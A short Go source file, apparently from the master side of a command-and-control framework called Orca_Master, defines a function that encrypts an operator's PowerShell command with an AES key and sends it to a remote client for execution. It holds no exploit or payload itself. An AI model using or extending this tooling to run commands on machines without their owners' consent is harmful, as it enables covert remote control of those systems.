package powershellopt

import (
	"Orca_Master/cli/common"
	"Orca_Master/define/config"
	"Orca_Master/tools/crypto"
	"encoding/json"
)

func SendExecShellMsg(clientId, cmdStr, msgId string) common.HttpRetData {
	sendUserId := common.ClientId
	msg := "execPowershell"
	cmdInfo := &common.CmdInfo{
		Context: cmdStr,
		Attach:  "",
	}
	cmdData, _ := json.Marshal(cmdInfo)
	data, _ := crypto.Encrypt(cmdData, []byte(config.AesKey))
	retData := common.SendSuccessMsg(clientId, sendUserId, msg, data, msgId)
	return retData
}
